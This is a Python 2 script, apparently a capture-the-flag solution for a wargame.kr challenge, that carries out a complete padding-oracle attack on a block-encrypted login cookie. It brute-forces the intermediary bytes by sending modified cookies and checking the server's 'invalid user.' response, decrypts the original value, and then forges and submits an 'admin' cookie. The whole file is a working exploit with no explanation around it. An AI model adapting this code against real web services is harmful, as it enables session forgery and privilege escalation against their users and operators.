import urllib, urllib2, base64, sys, requests, binascii

def send_request(cookie):
	cookie = "L0g1n="+cookie
	headers = {'Host':'wargame.kr:8080', 'Cookie':cookie}
	req = urllib2.Request("http://wargame.kr:8080/dun_worry_about_the_vase/main.php", '', headers)
	response = urllib2.urlopen(req)
        res = response.read()	
	return res

def block2cookie(a):
	s = binascii.unhexlify(a)
	test = [ord(x) for x in s]
	test2 = ''
	for i in test:
		test2 += chr(i)
	return test2.encode('base64')

def brute_force():
	test = ''
	index = 16
	intermediary = ''
	saved_data = ''
        for i in range(1, 9):
		for j in range(0x00, 0xff+1):
                	hex_data = hex(j)[2:]
			brute = (hex_data + saved_data).zfill(16)
			print '[+] '+brute
			q = block2cookie(brute.zfill(16))[0:12]
			q += block2cookie(block2)[0:12]
			if 'invalid user.' in send_request(q):
				print send_request(q)
				print '[+] Success!! '+brute
				intermediary = hex(int('0x'+hex_data.zfill(2), 16) ^ i)[2:] + intermediary
				intermediary = intermediary.zfill(i*2)
				saved_data = ''
				for k in xrange(0 ,len(intermediary), 2):
					saved_data += hex(int('0x'+intermediary[k:k+2], 16) ^ i+1)[2:]
				saved_data = saved_data.zfill(i*2)
				print '[+] Intermediary Value : '+ intermediary
				print '[+] Saved_data : '+saved_data+'\n'
				break
	return intermediary

cookie = urllib.unquote(sys.argv[1])
cookie1 = cookie.split('=')[0] + '='
cookie2 = cookie.split('=')[1] + '='

decoded_cookie1 = cookie1.decode('base64')
decoded_cookie2 = cookie2.decode('base64')

block1 = ''
block2 = ''

for i in decoded_cookie1:
	block1 += hex(ord(i))[2:].zfill(2)

for i in decoded_cookie2:
	block2 += hex(ord(i))[2:].zfill(2)

block1 = block1
block2 = block2
print block1.upper()
print block2.upper()

intermediary_value = brute_force()
#intermediary_value = '64c35613138d92d2' --> A7YzYGeOkdE%3DrTLzxqPqENs%3D
decrypted_value = ''

for i in xrange(0, len(intermediary_value), 2):
	decrypted_value += chr(int('0x'+block1[i:i+2], 16) ^ int('0x'+intermediary_value[i:i+2], 16))

print '[+] Decrypted Value : '+decrypted_value
admin_value = '61646d696e030303'
guest_value = '6775657374030303'

encrypted_value = ''
for i in xrange(0, len(intermediary_value), 2):
        encrypted_value += hex(int('0x'+admin_value[i:i+2], 16) ^ int('0x'+intermediary_value[i:i+2], 16))[2:].zfill(2)

print encrypted_value
encrypted_cookie = block2cookie(encrypted_value.zfill(16))[0:12] + block2cookie(block2)[0:12]
print encrypted_cookie
print send_request(encrypted_cookie)
